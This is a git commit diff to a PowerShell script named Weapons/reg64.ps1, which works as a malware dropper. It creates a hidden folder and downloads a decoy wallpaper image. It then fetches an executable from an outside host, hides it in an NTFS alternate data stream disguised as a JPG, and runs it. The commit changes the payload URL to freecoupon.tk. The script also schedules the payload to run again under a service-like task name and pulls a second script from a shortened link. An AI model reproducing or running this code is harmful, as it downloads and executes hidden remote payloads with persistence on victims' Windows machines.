6815f8d0c27e6a828b9f465b5e30c7349b13d246
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-05-10 01:52:36 +0530

    Update reg64.ps1

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -3,7 +3,8 @@
 mkdir C:\ProgramData\.temp
 [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
 curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
-cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
+# cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
+cmd /c "curl https://freecoupon.tk/freecoupon_forlife.exe -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
 # schtasks /create /s $env:ComputerName /ru "SYSTEM" /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 12/25/2025 /st 15:00:00 /v1 /z
 cmd /c 'schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /st 15:00 /sd 12/25/2025'
 wget -O C:\ProgramData\.temp\system64.ps1 https://bit.ly/3KlymYH
